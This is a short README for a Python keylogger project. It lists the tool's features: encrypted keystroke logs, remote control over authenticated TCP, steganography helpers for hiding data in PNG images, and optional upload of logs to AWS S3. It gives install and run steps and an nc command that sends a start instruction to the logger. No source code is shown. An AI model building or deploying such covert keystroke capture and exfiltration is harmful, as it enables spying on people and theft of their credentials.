# a-keylogger-attempt

A Python demo of a secure keylogger with encrypted local storage, remote control, steganography helpers, and optional AWS S3 upload support.

## Features

- AES-256-GCM encrypted keylog storage
- Password-based key derivation with PBKDF2-HMAC-SHA256
- Background buffer flush to keep disk writes efficient
- Remote control via authenticated TCP commands
- Steganography helpers for hiding bytes inside PNG images
- Optional AWS S3 upload support for encrypted log files

## Requirements

- Python 3.8+
- `keyboard`
- `cryptography`
- `Pillow`
- `boto3`

## Usage

1. Install dependencies:
   ```bash
   pip install keyboard cryptography Pillow boto3
   ```

2. Run:
   ```bash
   python secure_keylogger.py
   ```

3. Use a remote client to send commands:
   ```bash
   echo "MySecretToken123 START" | nc localhost 4444
   ```
